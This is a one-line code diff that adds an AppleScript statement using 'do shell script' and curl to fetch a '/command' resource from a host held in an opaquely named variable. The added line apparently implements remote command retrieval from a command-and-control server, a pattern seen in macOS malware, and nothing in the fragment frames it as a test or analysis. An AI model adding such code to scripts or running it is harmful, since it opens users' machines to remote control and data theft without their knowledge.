@@ -1,0 +1,1 @@
+set v123 to do shell script \"curl -s http://\" & p456 & \"/command\"
